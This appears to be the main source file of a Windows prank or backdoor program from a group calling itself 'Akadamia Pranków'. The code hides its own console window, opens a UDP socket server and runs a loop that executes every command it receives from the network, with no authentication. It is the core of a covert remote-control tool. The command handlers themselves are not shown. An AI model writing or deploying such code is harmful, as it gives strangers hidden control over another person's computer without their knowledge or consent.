//#pragma balls
/*
*   Made by the Akadamia Pranków Cheetos
*/


#include "Main.h"
#include "src/Funnies.h"
#include "src/Socket.h"

struct TeltharSocket tsocket;

extern const char *PCName;

int main(int argc, char *argv[])
{
    HWND window = GetConsoleWindow();
    ShowWindow(window, SW_MINIMIZE);
    ShowWindow(window, SW_HIDE);

    if (argv[1] == NULL) {
        sendError("Callname not defined.");
        return 1;
    }

    PCName = argv[1];

    if (UDPBegin(&tsocket) != 0) {
        sendError("Couldn't initialize socket server.");
        return -1;
    }

    while (1) {
        JBCMD recv;
        if (UDPRecv(&tsocket, &recv, sizeof(JBCMD)) == -1) {
            sendError("Socket error.\n");
            return -1;
        }
        execCommand(recv);
    }
    return 0;
}